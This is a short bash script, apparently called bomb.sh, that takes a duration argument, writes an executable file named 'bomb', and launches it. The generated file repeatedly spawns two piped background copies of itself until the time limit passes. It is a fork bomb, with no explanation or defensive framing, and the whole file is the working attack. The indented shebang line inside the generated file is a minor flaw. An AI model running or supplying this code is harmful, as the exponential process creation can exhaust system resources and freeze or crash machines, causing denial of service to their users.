#!/bin/bash
if [[ -z $1 ]]; then
  echo "Add duration in seconds as an argument, for example: bomb.sh 60"
else
  export bomb_duration=$1
  export bomb_start=$(date +%s)

  touch bomb
  chmod +x bomb
  echo "
  #!/bin/bash
  echo \$!
  now=\$(date +%s)
  if [[ \$((\$now-\$bomb_start)) -gt \$bomb_duration ]]
      then exit 0;
  fi
  ./\$0|./\$0&
  " > bomb
  ./bomb
fi
